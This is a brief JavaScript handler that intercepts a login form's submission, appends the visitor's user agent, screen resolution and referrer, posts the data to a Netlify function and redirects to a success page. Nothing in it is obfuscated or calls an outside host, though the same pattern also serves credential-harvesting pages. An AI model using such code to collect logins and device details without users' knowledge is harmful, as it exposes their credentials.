document.addEventListener("DOMContentLoaded", function () {
  const form = document.querySelector("form[name='login']");

  form.addEventListener("submit", function (event) {
    event.preventDefault(); // Prevent default form submission

    // Collect extra user data
    const userAgent = navigator.userAgent;
    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const referrer = document.referrer || "Direct Access";

    // Get form data
    const formData = new FormData(form);
    formData.append("userAgent", userAgent);
    formData.append("screenResolution", screenResolution);
    formData.append("referrer", referrer);

    // Send the data via fetch to Netlify function
    fetch("/.netlify/functions/submit", {
      method: "POST",
      body: new URLSearchParams(formData),
    })
      .then((response) => response.text())
      .then((data) => {
        console.log("Success:", data);
        window.location.href = "/success.html"; // Redirect on success
      })
      .catch((error) => {
        console.error("Error:", error);
      });
  });
});
